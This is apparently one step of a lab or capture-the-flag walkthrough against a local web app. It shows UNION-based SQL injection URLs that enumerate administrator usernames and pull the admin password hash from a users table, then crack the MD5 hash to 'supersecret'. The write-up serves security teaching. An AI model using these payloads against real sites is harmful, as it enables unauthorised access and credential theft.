# (g) Get username and password for Administrator/s

We have to assume that there may be a few Administrators of the application so we will be using again **LIMIT** and **OFFSET** clauses for listing one column at a time.

From the previous steps we know that the **users** table have all the user's data.
We also know the structure of that table:

- id
- username
- password
- isAdmin
- firstname
- lastname
- avatar
- description

So we need to query the **users** table asking for the **_username_** where **isAdmin=true**, like this:
```shell
SELECT username FROM users WHERE isAdmin=1 LIMIT 1 OFFSET 0
```

> **Note:** 
>
> in MySQL true == 1 when quering


Injecting the query in the browser should look like this:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT username FROM users WHERE isAdmin=1 LIMIT 1 OFFSET 0),3,4,5,6,7,8,9/slug-name-post'
```


And we keep **increasing the OFFSET** value until we get a blank response.

--

Let say we get **only one** administrator user, with **username='admin'**. Now we need to get the password:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT password FROM users WHERE username='admin' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9/slug-name-post'
```

And we will get some string like this as result:
```shell
9a618248b64db62d15b300a07b00580b
```

This looks like a MD5 hash, so we could use the same online cracking tool we used some steps before to get a plain text password: [https://crackstation.net/](https://crackstation.net/)


The result is: **supersecret**, which is the admin user password.
